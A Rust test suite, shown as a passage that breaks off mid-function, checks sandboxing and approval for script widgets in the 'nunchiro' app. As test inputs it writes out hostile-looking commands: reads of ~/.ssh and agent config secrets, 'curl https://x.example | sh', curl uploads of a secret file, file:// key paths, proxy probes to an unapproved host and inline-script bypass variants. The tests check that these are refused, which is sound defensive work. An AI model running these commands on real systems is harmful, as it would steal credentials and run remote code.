//! Script widgets (ticket v1b-19): one named test per acceptance item and edge case, through the public
//! `widgets` API and the real macOS sandbox. Homes are short temp dirs (fixtures/home.rs); "~" is a fake home.
#[path = "fixtures/home.rs"]
mod home;
use nunchiro_core::{
    approval::{self, Level, State},
    widgets::{self, Config, Context, ContextProject, ContextSession, Output, Project},
};
use std::{fs, os::unix::fs::PermissionsExt, path::PathBuf, time::Duration};

struct H {
    root: PathBuf,
    home: PathBuf,
    user: PathBuf,
    project: PathBuf,
}
impl H {
    fn new() -> Self {
        let root = home::short("wg");
        for d in ["home", "user", "proj"] {
            fs::create_dir_all(root.join(d)).unwrap();
        }
        Self {
            home: root.join("home"),
            user: root.join("user"),
            project: root.join("proj"),
            root,
        }
    }
    fn widget(&self, name: &str, extra: &str, script: &str) -> PathBuf {
        let d = self.home.join("widgets").join(name);
        fs::create_dir_all(&d).unwrap();
        fs::write(
            d.join("widget.toml"),
            format!("version=1\nkind='script'\ncommand=['/bin/sh','run.sh']\n{extra}"),
        )
        .unwrap();
        fs::write(d.join("run.sh"), script).unwrap();
        d
    }
    fn grant(&self, name: &str) {
        let v = approval::status(&self.home, name).unwrap();
        approval::grant(&self.home, name, Level::Read, &v.hash).unwrap();
    }
    fn config(&self) -> Config {
        Config::new(true, self.user.clone())
    }
    fn project(&self) -> Option<Project> {
        Some(Project {
            name: "proj".into(),
            dir: self.project.clone(),
        })
    }
    fn run(&self, name: &str) -> Result<widgets::Run, String> {
        widgets::run(&self.home, &self.config(), name, self.project(), &context())
    }
    fn cache(&self, name: &str) -> PathBuf {
        self.home.join("widgets").join(name).join("cache")
    }
}
impl Drop for H {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.root);
    }
}
fn context() -> Context {
    Context {
        projects: vec![ContextProject {
            name: "proj".into(),
        }],
        sessions: vec![ContextSession {
            label: "리뷰-03".into(),
            project: "proj".into(),
            state: nunchiro_core::api::SessionState::Running,
        }],
    }
}
fn text(run: &widgets::Run) -> String {
    match run.output.as_ref() {
        Some(Output::Text { text }) => text.clone(),
        other => panic!(
            "expected text output, got {other:?} (error {:?})",
            run.error
        ),
    }
}

#[test]
fn widgets_run_only_after_approval() {
    let h = H::new();
    h.widget(
        "demo",
        "",
        "echo ran > \"$NUNCHIRO_CACHE/marker\"\necho hello\n",
    );
    let err = h.run("demo").unwrap_err();
    assert!(err.contains("not approved"), "{err}");
    assert!(
        !h.cache("demo").join("marker").exists(),
        "unapproved widget spawned"
    );
    h.grant("demo");
    assert_eq!(text(&h.run("demo").unwrap()), "hello\n");
    assert!(h.cache("demo").join("marker").exists());
}

#[test]
fn widgets_manifest_change_asks_again() {
    for change in ["manifest", "command file", "exec bit"] {
        let h = H::new();
        let d = h.widget("demo", "", "echo ran > \"$NUNCHIRO_CACHE/marker\"\n");
        h.grant("demo");
        match change {
            "manifest" => fs::write(
                d.join("widget.toml"),
                "version=1\nkind='script'\ncommand=['/bin/sh','run.sh']\ninterval=30\n",
            )
            .unwrap(),
            "command file" => fs::write(
                d.join("run.sh"),
                "echo other > \"$NUNCHIRO_CACHE/marker\"\n",
            )
            .unwrap(),
            _ => fs::set_permissions(d.join("run.sh"), fs::Permissions::from_mode(0o755)).unwrap(),
        }
        assert_eq!(
            approval::status(&h.home, "demo").unwrap().state,
            State::Changed,
            "{change}"
        );
        let listed = widgets::list(&h.home, &h.config());
        assert_eq!(listed.widgets[0].state, Some(State::Changed), "{change}");
        let err = h.run("demo").unwrap_err();
        assert!(
            err.contains("changed since it was approved"),
            "{change}: {err}"
        );
        assert!(
            !h.cache("demo").join("marker").exists(),
            "{change}: ran before regrant"
        );
        h.grant("demo");
        h.run("demo").unwrap();
        assert!(
            h.cache("demo").join("marker").exists(),
            "{change}: regrant did not run"
        );
    }
}

#[test]
fn widgets_cannot_write_outside_cache() {
    let h = H::new();
    let tmp = PathBuf::from(format!(
        "/private/tmp/nunchiro-widget-probe-{}",
        std::process::id()
    ));
    let targets = [
        h.project.join("probe"),
        h.home.join("probe"),
        h.home.join("widgets/demo/probe"),
        tmp.clone(),
        h.user.join("probe"),
    ];
    let mut script = String::new();
    for t in &targets {
        script.push_str(&format!(
            "if echo bad > '{0}' 2>/dev/null; then echo 'WROTE {0}'; fi\n",
            t.display()
        ));
    }
    script.push_str("echo ok > \"$NUNCHIRO_CACHE/ok\" && echo CACHE-OK\n");
    h.widget("demo", "", &script);
    h.grant("demo");
    let out = text(&h.run("demo").unwrap());
    let _ = fs::remove_file(&tmp);
    assert_eq!(out, "CACHE-OK\n");
    for t in &targets {
        assert!(!t.exists(), "{} was written", t.display());
    }
    assert_eq!(
        fs::read_to_string(h.cache("demo").join("ok")).unwrap(),
        "ok\n"
    );
}

#[test]
fn widgets_cannot_reach_unapproved_host() {
    use std::os::unix::net::UnixListener;
    let h = H::new();
    // Stand-ins for the window's loopback port and the core's unix socket.
    let window = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    window.set_nonblocking(true).unwrap();
    let port = window.local_addr().unwrap().port();
    let sock = h.root.join("core.sock");
    let core = UnixListener::bind(&sock).unwrap();
    core.set_nonblocking(true).unwrap();
    let connect = |host: &str| {
        format!(
            "printf 'CONNECT {host}:443 HTTP/1.1\\r\\nHost: {host}\\r\\n\\r\\n' | /usr/bin/nc -w 2 127.0.0.1 \"${{HTTPS_PROXY##*:}}\" | /usr/bin/head -1\n"
        )
    };
    h.widget(
        "demo",
        // `localhost` is approved but resolves to loopback: the proxy's address check refuses it.
        "network=['localhost']\n",
        &format!(
            "{}{}if /usr/bin/nc -z -w 1 127.0.0.1 {port} 2>/dev/null; then echo DIRECT-OK; fi\nif echo x | /usr/bin/nc -U -w 1 '{}' 2>/dev/null; then echo UNIX-OK; fi\necho END\n",
            connect("unapproved.example"),
            connect("localhost"),
            sock.display()
        ),
    );
    h.grant("demo");
    let out = text(&h.run("demo").unwrap());
    let lines: Vec<&str> = out.lines().collect();
    assert_eq!(lines.len(), 3, "{out}");
    assert!(
        lines[0].starts_with("HTTP/1.1 403"),
        "unapproved host: {out}"
    );
    assert!(
        lines[1].starts_with("HTTP/1.1 403"),
        "approved host resolving to loopback: {out}"
    );
    assert_eq!(
        lines[2], "END",
        "direct or unix connection succeeded: {out}"
    );
    assert!(window.accept().is_err(), "window port was reached");
    assert!(core.accept().is_err(), "core socket was reached");
    // An approved host whose answer is public passes the same check the proxy dials through.
    let allowed = vec!["api.github.com".to_string()];
    let ok = nunchiro_core::sandbox::proxy::checked_addresses("api.github.com", &allowed, |_| {
        Ok(vec!["140.82.112.6".parse().unwrap()])
    });
    assert_eq!(
        ok.unwrap(),
        vec!["140.82.112.6".parse::<std::net::IpAddr>().unwrap()]
    );
}

#[test]
fn widgets_see_no_session_token() {
    let h = H::new();
    let token = "FAKE-SESSION-TOKEN-SENTINEL";
    fs::write(h.home.join("core.token"), token).unwrap();
    fs::write(
        h.home.join("window.json"),
        format!("{{\"token\":\"{token}\"}}"),
    )
    .unwrap();
    let mut reads = vec![h.home.join("core.token"), h.home.join("window.json")];
    for d in [".claude", ".codex", ".ssh", ".nunchiro"] {
        fs::create_dir_all(h.user.join(d)).unwrap();
        fs::write(h.user.join(d).join("secret"), token).unwrap();
        reads.push(h.user.join(d).join("secret"));
    }
    let mut script = String::from("/usr/bin/env\necho ---\n");
    for r in &reads {
        script.push_str(&format!(
            "/bin/cat '{}' 2>/dev/null && echo 'READ {}'\n",
            r.display(),
            r.display()
        ));
    }
    script.push_str("echo END\n");
    h.widget("demo", "", &script);
    h.grant("demo");
    let out = text(&h.run("demo").unwrap());
    assert!(
        !out.contains(token),
        "a token value reached the widget:\n{out}"
    );
    assert!(
        !out.contains("NUNCHIRO_TOKEN") && !out.contains("READ "),
        "{out}"
    );
    assert!(out.ends_with("---\nEND\n"), "{out}");
}

#[test]
fn widgets_production_config_denies_the_real_agent_config() {
    // Read-only probe of the user's real ~/.claude and ~/.codex with the core's own config (no write is attempted).
    let h = H::new();
    let real = PathBuf::from(std::env::var_os("HOME").unwrap());
    let probes: Vec<PathBuf> = [".claude/settings.json", ".codex/config.toml"]
        .iter()
        .map(|p| real.join(p))
        .filter(|p| p.is_file())
        .collect();
    let mut script = String::new();
    for p in &probes {
        script.push_str(&format!(
            "/bin/cat '{}' >/dev/null 2>&1 && echo 'READ {}'\n",
            p.display(),
            p.display()
        ));
    }
    script.push_str("echo END\n");
    h.widget("demo", "", &script);
    h.grant("demo");
    let run = widgets::run(&h.home, &Config::new(true, real), "demo", None, &context()).unwrap();
    assert_eq!(text(&run), "END\n");
}

#[test]
fn widgets_api_enumeration() {
    let h = H::new();
    h.widget(
        "demo",
        "",
        "echo \"cwd=$(/bin/pwd -P)\"\necho \"proxy=$HTTPS_PROXY\"\n/usr/bin/env | /usr/bin/cut -d= -f1 | /usr/bin/sort\necho ---\n/bin/cat \"$NUNCHIRO_CONTEXT\"\n",
    );
    h.grant("demo");
    let out = text(&h.run("demo").unwrap());
    let (head, ctx) = out.split_once("---\n").unwrap();
    let mut lines = head.lines();
    let cwd = lines.next().unwrap().strip_prefix("cwd=").unwrap();
    let runs = h.cache("demo").canonicalize().unwrap().join(".runs");
    assert!(
        cwd.starts_with(runs.to_str().unwrap()),
        "cwd {cwd} is not the approved snapshot"
    );
    let proxy = lines.next().unwrap().strip_prefix("proxy=").unwrap();
    assert!(proxy.starts_with("http://127.0.0.1:"), "{proxy}");
    let mut keys: Vec<&str> = lines
        .filter(|k| !["PWD", "SHLVL", "_"].contains(k))
        .collect();
    keys.sort();
    let mut expected = vec![
        "HOME",
        "HTTPS_PROXY",
        "HTTP_PROXY",
        "LANG",
        "LC_ALL",
        "NUNCHIRO_CACHE", // v1b-21
        "NUNCHIRO_CONTEXT",
        "NUNCHIRO_PROJECT_DIR",
        "PATH",
        "__CF_USER_TEXT_ENCODING", // v1b-33 r2
        "TMPDIR",
        "http_proxy",
        "https_proxy",
    ];
    expected.sort();
    assert_eq!(keys, expected, "environment keys");
    let ctx: serde_json::Value = serde_json::from_str(ctx).unwrap();
    assert_eq!(
        ctx,
        serde_json::json!({"projects":[{"name":"proj"}],"sessions":[{"label":"리뷰-03","project":"proj","state":"running"}]})
    );
    // The window's widget-facing requests: every `op:` the widget UI and the permission sheet send.
    let web = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../web/src");
    let mut files = vec![web.join("approval/PermissionSheet.tsx")];
    for e in fs::read_dir(web.join("widgets")).unwrap() {
        files.push(e.unwrap().path());
    }
    // v1b-22: the web widget host and bridge.
    for e in fs::read_dir(web.join("webwidgets")).unwrap() {
        files.push(e.unwrap().path());
    }
    let mut ops = std::collections::BTreeSet::new();
    for f in files {
        let src = fs::read_to_string(&f).unwrap();
        for part in src.split("op: '").skip(1) {
            ops.insert(part.split('\'').next().unwrap().to_string());
        }
    }
    let expected: std::collections::BTreeSet<String> = widgets::WINDOW_REQUESTS
        .iter()
        .map(|s| s.to_string())
        .collect();
    assert_eq!(ops, expected, "window widget requests");
    for op in &ops {
        assert!(
            ![
                "answer",
                "quit_settings",
                "layout",
                "agent_read",
                "chat_page",
                "read",
                "send_text",
                "send_keys"
            ]
            .contains(&op.as_str()),
            "{op} answers decisions, changes settings or layout, or reads transcripts"
        );
    }
}

#[test]
fn widgets_refuse_without_sandbox() {
    let h = H::new();
    h.widget("demo", "", "echo ran > \"$NUNCHIRO_CACHE/marker\"\n");
    h.grant("demo");
    let mut missing = h.config();
    missing.executable = h.root.join("missing-sandbox-exec");
    let listed = widgets::list(&h.home, &missing);
    assert!(
        listed
            .unavailable
            .as_deref()
            .is_some_and(|u| u.starts_with("script widgets unavailable: ")),
        "{listed:?}"
    );
    let err = widgets::run(&h.home, &missing, "demo", None, &context()).unwrap_err();
    assert!(err.starts_with("script widgets unavailable: "), "{err}");
    // A "sandbox" that confines nothing fails the self-check, and the widget never runs unconfined.
    let fake = h.root.join("passthrough-sandbox-exec");
    fs::write(&fake, "#!/bin/sh\nshift 3\nexec \"$@\"\n").unwrap();
    fs::set_permissions(&fake, fs::Permissions::from_mode(0o755)).unwrap();
    let mut open = h.config();
    open.executable = fake;
    let err = widgets::run(&h.home, &open, "demo", None, &context()).unwrap_err();
    assert!(
        err.starts_with("script widgets unavailable: sandbox self-check"),
        "{err}"
    );
    assert!(!h.cache("demo").join("marker").exists(), "ran unconfined");
    let listed = widgets::list(&h.home, &open);
    assert_eq!(listed.unavailable.as_deref(), Some(err.as_str()));
}

#[test]
fn widgets_setting_off_refuses_and_lists() {
    let h = H::new();
    h.widget("demo", "", "echo ran > \"$NUNCHIRO_CACHE/marker\"\n");
    h.grant("demo");
    let mut off = h.config();
    off.enabled = false;
    let listed = widgets::list(&h.home, &off);
    assert!(!listed.enabled);
    assert_eq!(listed.widgets[0].name, "demo");
    let err = widgets::run(&h.home, &off, "demo", None, &context()).unwrap_err();
    assert_eq!(err, widgets::OFF);
    assert!(err.contains("settings.json `script_widgets`"));
    assert!(!h.cache("demo").join("marker").exists());
}

#[test]
fn widgets_hot_reload_lists_new_and_drops_deleted() {
    let h = H::new();
    assert!(widgets::list(&h.home, &h.config()).widgets.is_empty());
    let d = h.widget("fresh", "", "echo hi\n");
    fs::create_dir_all(h.home.join("widgets/broken")).unwrap();
    fs::write(h.home.join("widgets/broken/widget.toml"), "version=2\n").unwrap();
    let l = widgets::list(&h.home, &h.config());
    let names: Vec<_> = l.widgets.iter().map(|w| w.name.as_str()).collect();
    assert_eq!(names, ["broken", "fresh"]);
    assert!(l.widgets[0].error.is_some() && l.widgets[0].state.is_none());
    assert_eq!(l.widgets[1].state, Some(State::Unapproved));
    fs::remove_dir_all(d).unwrap();
    let l = widgets::list(&h.home, &h.config());
    assert!(l.widgets.iter().all(|w| w.name != "fresh"));
}

#[test]
fn widgets_timeout_kills_process_group() {
    let h = H::new();
    h.widget(
        "demo",
        "",
        "(/bin/sleep 30; echo late > \"$NUNCHIRO_CACHE/late\") &\necho $! > \"$NUNCHIRO_CACHE/child\"\n/bin/sleep 30\n",
    );
    h.grant("demo");
    let run = h.run("demo").unwrap();
    assert_eq!(run.error.as_deref(), Some("timed out after 5 s"));
    assert!(run.output.is_none());
    let pid: i32 = fs::read_to_string(h.cache("demo").join("child"))
        .unwrap()
        .trim()
        .parse()
        .unwrap();
    std::thread::sleep(Duration::from_millis(200));
    assert_ne!(
        unsafe { libc::kill(pid, 0) },
        0,
        "background child {pid} survived the timeout"
    );
}

#[test]
fn widgets_output_over_cap_is_an_error() {
    let h = H::new();
    h.widget(
        "demo",
        "",
        "/usr/bin/perl -e 'print \"[\" . (\"1,\" x 600000) . \"1]\"'\n",
    );
    h.grant("demo");
    let run = h.run("demo").unwrap();
    assert_eq!(run.error.as_deref(), Some("output over 1 MiB"));
    assert!(run.output.is_none(), "partial output returned");
}

#[test]
fn widgets_output_parsing() {
    let array = r#"[{"b":1},{"a":"한글 🎉"}]"#;
    assert_eq!(
        widgets::parse(array.as_bytes()),
        Output::Json { text: array.into() }
    );
    assert_eq!(
        widgets::parse(b"{\"x\":2}\n"),
        Output::Json {
            text: "{\"x\":2}\n".into()
        }
    );
    assert_eq!(
        widgets::parse(b"[1, 2] trailing"),
        Output::Text {
            text: "[1, 2] trailing".into()
        }
    );
    assert_eq!(
        widgets::parse(b"\x1b[31mred\x1b[0m\n"),
        Output::Text {
            text: "\x1b[31mred\x1b[0m\n".into()
        }
    );
}

#[test]
fn widgets_two_placements_share_one_run() {
    let h = H::new();
    h.widget(
        "demo",
        "",
        "echo x >> \"$NUNCHIRO_CACHE/count\"\n/bin/sleep 1\necho done\n",
    );
    h.grant("demo");
    let (a, b) = std::thread::scope(|s| {
        let a = s.spawn(|| h.run("demo").unwrap());
        std::thread::sleep(Duration::from_millis(200));
        let b = s.spawn(|| h.run("demo").unwrap());
        (a.join().unwrap(), b.join().unwrap())
    });
    assert!(
        b.running && b.output.is_none(),
        "second caller started its own run: {b:?}"
    );
    assert_eq!(text(&a), "done\n");
    let c = h.run("demo").unwrap();
    assert_eq!(c.ran_at_ms, a.ran_at_ms, "early call ran again");
    assert_eq!(
        fs::read_to_string(h.cache("demo").join("count")).unwrap(),
        "x\n"
    );
}

#[test]
fn widgets_interval_floor_is_ten_seconds() {
    let h = H::new();
    h.widget(
        "demo",
        "interval=1\n",
        "echo x >> \"$NUNCHIRO_CACHE/count\"\n",
    );
    h.grant("demo");
    let a = h.run("demo").unwrap();
    assert_eq!(a.interval_secs, 10);
    std::thread::sleep(Duration::from_millis(1200));
    let b = h.run("demo").unwrap();
    assert_eq!(a.ran_at_ms, b.ran_at_ms);
    assert_eq!(
        fs::read_to_string(h.cache("demo").join("count")).unwrap(),
        "x\n"
    );
    h.widget("plain", "", "echo y\n");
    h.grant("plain");
    assert_eq!(h.run("plain").unwrap().interval_secs, 60);
}

#[test]
fn widgets_posix_spawn_fails_closed() {
    let h = H::new();
    h.widget(
        "demo",
        "",
        "/usr/bin/perl -e 'syscall(244,0,0,0,0,0,0) == -1 and die \"posix_spawn denied: $!\\n\"; print \"spawned\\n\"'\n",
    );
    h.grant("demo");
    let run = h.run("demo").unwrap();
    let err = run.error.unwrap_or_default();
    assert!(
        err.starts_with("sandbox command failed") && err.contains("posix_spawn denied"),
        "{err}"
    );
}

#[test]
fn widgets_no_project_gives_no_project_dir() {
    let h = H::new();
    h.widget("demo", "", "echo \"dir=${NUNCHIRO_PROJECT_DIR:-none}\"\n");
    h.grant("demo");
    let run = widgets::run(&h.home, &h.config(), "demo", None, &context()).unwrap();
    assert_eq!(text(&run), "dir=none\n");
    assert_eq!(run.project, None);
}

#[test]
fn widgets_context_file_replaces_a_planted_symlink() {
    let h = H::new();
    let victim = h.root.join("victim");
    fs::write(&victim, "keep").unwrap();
    h.widget("demo", "", "echo hi\n");
    h.grant("demo");
    fs::create_dir_all(h.cache("demo")).unwrap();
    std::os::unix::fs::symlink(&victim, h.cache("demo").join("context.json")).unwrap();
    h.run("demo").unwrap();
    assert_eq!(fs::read_to_string(&victim).unwrap(), "keep");
    let meta = fs::symlink_metadata(h.cache("demo").join("context.json")).unwrap();
    assert!(meta.is_file());
    assert_eq!(meta.permissions().mode() & 0o777, 0o600);
}

#[test]
fn widgets_new_scaffold() {
    let h = H::new();
    let dir = widgets::scaffold(&h.home, "my-widget", None).unwrap();
    let v = approval::status(&h.home, "my-widget").unwrap();
    assert_eq!(v.state, State::Unapproved);
    assert_eq!(v.manifest.kind, "script");
    assert_eq!(v.manifest.author, "unknown");
    assert!(dir.join("widget.sh").is_file());
    let err = widgets::scaffold(&h.home, "my-widget", None).unwrap_err();
    assert!(err.contains("already exists"), "{err}");
    for bad in ["", "Bad", "-x", "a/b", "..", &"x".repeat(65)] {
        assert!(widgets::scaffold(&h.home, bad, None).is_err(), "{bad:?}");
    }
    let with = widgets::scaffold(&h.home, "authored", Some("리뷰-03")).unwrap();
    assert!(with.exists());
    assert_eq!(
        approval::status(&h.home, "authored")
            .unwrap()
            .manifest
            .author,
        "리뷰-03"
    );
    let other = H::new();
    let target = other.root.join("elsewhere");
    fs::create_dir_all(&target).unwrap();
    std::os::unix::fs::symlink(&target, other.home.join("widgets")).unwrap();
    let err = widgets::scaffold(&other.home, "demo", None).unwrap_err();
    assert!(err.contains("symlink"), "{err}");
    assert!(fs::read_dir(&target).unwrap().next().is_none());
}

#[test]
fn widgets_scaffold_runs_after_approval() {
    let h = H::new();
    fs::write(h.project.join("a-file"), "x").unwrap();
    widgets::scaffold(&h.home, "starter", None).unwrap();
    h.grant("starter");
    assert_eq!(text(&h.run("starter").unwrap()), "a-file\n");
}

// v1b-21: a cache past its cap refuses the run and keeps every cached file; the cap comes from Config.
#[test]
fn widgets_cache_over_cap_refuses_and_keeps_the_cache() {
    let h = H::new();
    h.widget("demo", "", "echo ran > \"$NUNCHIRO_CACHE/marker\"\n");
    h.grant("demo");
    fs::create_dir_all(h.cache("demo")).unwrap();
    fs::write(h.cache("demo").join("old"), vec![1u8; 2 * 1024 * 1024]).unwrap();
    let mut config = h.config();
    config.cache_limit = 1024 * 1024;
    let run = widgets::run(&h.home, &config, "demo", h.project(), &context()).unwrap();
    assert_eq!(run.error.as_deref(), Some("cache over 1 MiB"));
    assert!(!h.cache("demo").join("marker").exists());
    assert_eq!(
        fs::metadata(h.cache("demo").join("old")).unwrap().len(),
        2 * 1024 * 1024
    );
}

// v1b-21 r2 (ruling 09:48 Q2): a command path outside the widget folder never runs unhashed; argv[0] may name a
// system binary. Refused when the manifest loads, so the sheet shows why.
#[test]
fn widgets_command_paths_outside_the_folder_refused() {
    let h = H::new();
    for (i, command) in [
        "['/Users/x/bin/s.sh']",
        "['/bin/sh', '/Users/x/s.sh']",
        "['/bin/sh', '../other/run.sh']",
        "['/bin/sh', 'sub/../../run.sh']",
        "['../run.sh']",
        "['/usr/bin/../../Users/x/s.sh']",
        "['/opt/homebrew/bin/x', '/etc/passwd']",
        "['/Applications/X.app/Contents/MacOS/x']",
    ]
    .iter()
    .enumerate()
    {
        let name = format!("out{i}");
        let d = h.home.join("widgets").join(&name);
        fs::create_dir_all(&d).unwrap();
        fs::write(
            d.join("widget.toml"),
            format!("version=1\nkind='script'\ncommand={command}\n"),
        )
        .unwrap();
        let e = approval::status(&h.home, &name).unwrap_err();
        assert!(e.contains("outside the widget folder"), "{command}: {e}");
    }
    for (i, command) in [
        "['/bin/sh', 'run.sh']",
        "['run.sh']",
        "['/usr/bin/env', 'python3', 'lib/run.py']",
        "['/opt/homebrew/bin/jq', '-r', '.items[]', 'data.json']",
        "['/usr/local/bin/node', 'w.js']",
        "['/usr/sbin/sysctl', '-n', 'hw.ncpu']",
        "['/sbin/ping', '-c', '1', 'example.com']",
    ]
    .iter()
    .enumerate()
    {
        let name = format!("in{i}");
        let d = h.home.join("widgets").join(&name);
        fs::create_dir_all(&d).unwrap();
        fs::write(
            d.join("widget.toml"),
            format!("version=1\nkind='script'\ncommand={command}\n"),
        )
        .unwrap();
        approval::status(&h.home, &name).unwrap_or_else(|e| panic!("{command}: {e}"));
    }
}

// v1b-21 r3: a path is found anywhere inside a word, and an interpreter outside the folder never takes an inline
// script; URLs and relative files still pass.
#[test]
fn widgets_paths_inside_words_and_inline_scripts_refused() {
    let h = H::new();
    let load = |name: &str, command: &str| {
        let d = h.home.join("widgets").join(name);
        fs::create_dir_all(&d).unwrap();
        fs::write(
            d.join("widget.toml"),
            format!("version=1\nkind='script'\ncommand={command}\n"),
        )
        .unwrap();
        approval::status(&h.home, name)
    };
    for (i, (command, why)) in [
        (
            r#"['/usr/bin/tool', '--file=/Users/x/s.sh']"#,
            "outside the widget folder",
        ),
        (
            r#"['/usr/bin/curl', '-d', '@/Users/x/secret']"#,
            "outside the widget folder",
        ),
        (
            r#"['/usr/bin/tool', 'x=../y']"#,
            "outside the widget folder",
        ),
        (
            r#"['/usr/bin/tool', "it's /Users/x"]"#,
            "outside the widget folder",
        ),
        (
            r#"['/bin/sh', '-c', '. /Users/x/s.sh']"#,
            "outside the widget folder",
        ),
        (r#"['/bin/sh', '-c', 'echo hi']"#, "inline script"),
        (r#"['sh', '-c', 'echo hi']"#, "inline script"),
        (r#"['/bin/zsh', '-lc', 'echo hi']"#, "inline script"),
        (r#"['/usr/bin/env', '-S', 'sh run.sh']"#, "inline script"),
        (
            r#"['/usr/bin/env', '--split-string=sh run.sh']"#,
            "inline script",
        ),
        (
            r#"['/usr/bin/env', 'A=1', 'sh', '-c', 'echo hi']"#,
            "inline script",
        ),
        (r#"['/usr/bin/python3', '-c', 'print(1)']"#, "inline script"),
        (r#"['/usr/bin/perl', '-e', 'print 1']"#, "inline script"),
        (r#"['/usr/local/bin/node', '--eval', '1']"#, "inline script"),
        (r#"['/usr/bin/osascript', '-e', 'beep']"#, "inline script"),
    ]
    .iter()
    .enumerate()
    {
        let e = load(&format!("bad{i}"), command).unwrap_err();
        assert!(e.contains(why), "{command}: {e}");
    }
    for (i, command) in [
        r#"['/usr/bin/curl', '-s', 'https://api.github.com/repos/o/r/pulls?state=open']"#,
        r#"['/opt/homebrew/bin/jq', '-r', '.items[] | .name', 'data.json']"#,
        r#"['/bin/sh', '-e', 'run.sh', '--state', 'open']"#,
        r#"['/usr/bin/env', 'LANG=C', 'python3', 'lib/run.py']"#,
        r#"['sh', 'open-prs.sh', '--state', 'open']"#,
        r#"['/usr/bin/tool', 'a/b', '1..5', '--x=y']"#,
    ]
    .iter()
    .enumerate()
    {
        load(&format!("good{i}"), command).unwrap_or_else(|e| panic!("{command}: {e}"));
    }
}

// v1b-31: load a script widget whose `command` is the TOML array `command`.
fn load(h: &H, name: &str, command: &str) -> Result<approval::View, String> {
    let d = h.home.join("widgets").join(name);
    fs::create_dir_all(&d).unwrap();
    fs::write(
        d.join("widget.toml"),
        format!("version=1\nkind='script'\ncommand={command}\n"),
    )
    .unwrap();
    approval::status(&h.home, name)
}

// v1b-31 (S1): an inline-code flag after option values, behind a wrapper or after `+o` is still found; `--` and the
// script operand end the interpreter's options.
#[test]
fn inline_script_flag_after_option_values_is_refused() {
    let h = H::new();
    // A long run of interpreter words (under the 64 KiB cap) is still refused; this checks the result, not the time.
    let long = format!("[{}'-c', 'x']", "'sh', '-a', ".repeat(4_000));
    for (i, command) in [
        "['/bin/bash', '-o', 'posix', '-c', 'curl https://x.example | sh']",
        "['/bin/bash', '+o', 'posix', '-c', 'echo hi']",
        "['python3', '-W', 'ignore', '-c', 'print(1)']",
        "['perl', '-I', 'lib', '-e', 'print 1']",
        "['/usr/bin/osascript', '-l', 'JavaScript', '-e', 'beep']",
        "['/usr/bin/nice', 'sh', '-c', 'echo hi']",
        "['/usr/bin/nice', '-n', '5', 'sh', '-c', 'echo hi']",
        "['timeout', '5', 'sh', '-c', 'echo hi']",
        "['/usr/bin/nohup', 'sh', '-c', 'echo hi']",
        "['/usr/bin/xargs', 'sh', '-c', 'echo hi']",
        "['/usr/bin/xargs', '-I', 'X', 'sh', '-c', 'echo X']",
        "['/usr/bin/env', '--chdir', 'D', 'sh', '-c', 'echo hi']",
        "['/usr/bin/env', '--unset', 'N', 'sh', '-c', 'echo hi']",
        "['/usr/bin/env', '--chdir', 'D', '-S', 'sh -c x']",
        "['/usr/bin/nice', 'env', 'A=1', 'timeout', '5', 'bash', '-o', 'posix', '-c', 'x']",
        "['/usr/bin/env', '--split=sh -c x']",
        "['/bin/SH', '-c', 'echo hi']",
        "['/usr/bin/ENV', '-S', 'sh -c x']",
        "['/usr/bin/Python3', '-c', 'print(1)']",
        "['fish', '--command=echo hi']",
        long.as_str(),
    ]
    .iter()
    .enumerate()
    {
        let e = load(&h, &format!("bad{i}"), command).unwrap_err();
        assert!(
            e.contains("inline script"),
            "{}: {e}",
            &command[..80.min(command.len())]
        );
    }
    for (i, command) in [
        "['python3', 'script.py', '-c', 'x']",
        "['/bin/sh', 'run.sh', '-c', 'x']",
        "['/bin/sh', '--', '-c', 'x']",
        "['/bin/sh', '-', '-c', 'x']",
        "['/bin/bash', '-o', 'posix', 'run.sh', '-c', 'x']",
        "['/usr/bin/nice', '-n', '5', 'python3', 'run.py', '-c', 'x']",
        "['/usr/bin/env', 'LANG=C', 'perl', 'run.pl', '-e', 'x']",
        "['/usr/bin/tool', '-']",
    ]
    .iter()
    .enumerate()
    {
        load(&h, &format!("good{i}"), command).unwrap_or_else(|e| panic!("{command}: {e}"));
    }
}

// v1b-31 (S2): `file:` URLs and home-relative words name files outside the folder; other URLs still pass.
#[test]
fn home_and_file_scheme_paths_count_as_outside_the_folder() {
    let h = H::new();
    for (i, command) in [
        "['/usr/bin/curl', 'file:///Users/x/.ssh/id_rsa']",
        "['/usr/bin/curl', 'FILE:/Users/x/.ssh/id_rsa']",
        "['/usr/bin/curl', '--url=file:///etc/passwd']",
        "['/usr/bin/tool', '$HOME/.ssh/id_rsa']",
        "['/usr/bin/tool', '${HOME}/.ssh/id_rsa']",
        "['/usr/bin/tool', '--key=$HOME/.ssh/id_rsa']",
        "['/usr/bin/tool', '~/.ssh/id_rsa']",
        "['/usr/bin/tool', '~root/.ssh/id_rsa']",
        "['/usr/bin/tool', '--key=~/.ssh/id_rsa']",
        "['/usr/bin/tool', '~']",
    ]
    .iter()
    .enumerate()
    {
        let e = load(&h, &format!("bad{i}"), command).unwrap_err();
        assert!(e.contains("outside the widget folder"), "{command}: {e}");
    }
    for (i, command) in [
        "['/usr/bin/curl', 'https://example.com/x']",
        "['/usr/bin/curl', 'https://example.com/~user/profile']",
        "['/opt/homebrew/bin/jq', '--arg', 'v', 'x', '.[] | select(.a == $v)', 'data.json']",
        "['/usr/bin/tool', 'a~b', 'profile.txt']",
    ]
    .iter()
    .enumerate()
    {
        load(&h, &format!("good{i}"), command).unwrap_or_else(|e| panic!("{command}: {e}"));
    }
}

// v1b-31 (S4): the sheet shows a command word only when every character is one `delivery::shown` draws, or a space.
#[test]
fn permission_sheet_shows_only_what_runs() {
    let h = H::new();
    for (i, (command, code)) in [
        (r#"["/bin/sh", "run.sh", "a\U000E0041"]"#, "U+E0041"),
        (r#"["/bin/sh", "run.sh", "a\u200Bb"]"#, "U+200B"),
        (r#"["/bin/sh", "run.sh", "a\u2028b"]"#, "U+2028"),
        (r#"["/bin/sh", "run.sh", "\uFEFFx"]"#, "U+FEFF"),
        (r#"["/bin/sh", "run.sh", "a\tb"]"#, "U+0009"),
        (r#"["/bin/sh", "run.sh", "a\u202Eb"]"#, "U+202E"),
    ]
    .iter()
    .enumerate()
    {
        let e = load(&h, &format!("bad{i}"), command).unwrap_err();
        assert!(e.contains("hidden") && e.contains(code), "{command}: {e}");
    }
    // Variation selectors are Default_Ignorable, so a word keeps only what draws: a keycap without U+FE0F, a flag.
    load(
        &h,
        "good",
